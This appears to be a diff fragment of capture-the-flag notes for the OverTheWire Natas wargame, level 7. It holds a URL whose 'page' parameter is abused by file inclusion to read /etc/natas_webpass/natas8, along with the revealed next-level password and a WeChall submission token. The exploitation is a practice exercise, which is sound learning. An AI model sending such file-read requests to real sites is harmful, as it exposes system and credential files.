@@ -33,7 +33,7 @@ this is the front page
 
 <div id="wechallform" class="ui-draggable" style="display: block;"><p>Submit token</p><form id="realwechallform" action="https://www.wechall.net/10-levels-on-Natas.html" enctype="application/x-www-form-urlencoded" method="post"><input type="hidden" name="wfid" value="8"><input type="hidden" name="password_solution" value="bmg8SvU1LizuWjx3y7xkNERkHxGre0GS"><input type="hidden" name="igotitnow" value="Register"></form></div></body>
 
-http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
+http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8 ⌨️
 xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q 🔐
 ```
 
